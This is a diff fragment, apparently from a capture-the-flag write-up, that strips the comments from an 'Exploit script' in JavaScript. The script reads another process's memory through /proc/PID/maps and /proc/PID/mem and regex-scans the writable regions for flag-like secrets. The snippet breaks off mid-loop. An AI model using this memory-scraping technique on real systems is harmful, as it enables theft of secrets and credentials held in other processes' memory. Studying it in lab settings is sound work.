@@ -45,22 +45,17 @@ This is a binary file that maps 1:1 onto the process's entire virtual memory spa
 ### Exploit script
 
 ```javascript
-// 1. Read the memory map of process PID 7
 const maps = fs.readFileSync("/proc/7/maps", "utf8").trim().split("\n");
 const mem = fs.openSync("/proc/7/mem", "r");
 
 for (const line of maps) {
     const parts = line.split(/\s+/);
-    // 2. Keep only regions with "rw" permission (where JS variables / the heap live)
     if (parts[1] && parts[1].includes("rw")) {
         const [start, end] = parts[0].split("-").map(x => parseInt(x, 16));
         const len = end - start;
         const buf = Buffer.alloc(len);
         try {
-            // 3. Read the binary data from address start -> end in RAM
             fs.readSync(mem, buf, 0, len, start);
-
-            // 4. Turn the bytes into a string and scan for the flag format with a regex
             const str = buf.toString("latin1");
             const matches = str.match(/[A-Za-z0-9_\-]{0,20}\{[^}\n\r\t ]+\}/g);
             if (matches) {
